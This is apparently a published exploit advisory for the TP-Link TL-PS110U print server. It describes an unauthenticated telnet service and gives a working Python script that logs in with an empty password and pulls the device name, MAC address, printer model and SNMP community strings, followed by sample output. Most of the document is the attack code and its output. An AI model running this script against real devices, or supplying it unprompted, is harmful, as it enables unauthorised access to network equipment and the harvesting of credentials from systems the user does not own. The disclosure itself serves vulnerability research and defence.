# Exploit Title: TP-Link Print Server Sensitive Information Enumeration
# Exploit Author: SANTHO
# Vendor Homepage: http://www.tp-link.com
# Software Link: http://www.tp-link.com/en/products/details/?model=TL-PS110U
# Version: TL PS110U
TP-Link TL PS110U Print Server runs telnet service which enables an
attacker to access the configuration details without authentication. The
PoC can extract device name, MAC address, manufacture name, Printer model,
and SNMP Community Strings.

*Sample Output*

root@bt# ./tplink-enum.py 10.0.0.2

Device Name : 1P_PrintServABCD

Node ID : AA-AA-AA-AA-AA-AA

Manufacture: Hewlett-Packard

Model: HP LaserJet M1005

Community 1: public Read-Only

Community 2: public Read-Only

import telnetlib
import sys
host = sys.argv[1]
tn = telnetlib.Telnet(host)
tn.read_until("Password:")
tn.write("\r\n")
tn.read_until("choice")
tn.write("1\r\n")
tn.read_until("choice")
tn.write("1\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
	if "Device Name" in i:
		print i.strip()
	if "Node ID" in i:
		print i.strip()
tn.write("0\r\n")
tn.read_until("choice")
tn.write("2\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
	if "Manufacture:" in i:
		print i.strip()
	if "Model:" in i:
		print i.strip()
tn.write("0\r\n")
tn.read_until("choice")
tn.write("5\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
	if "Community" in i:
		print i.strip()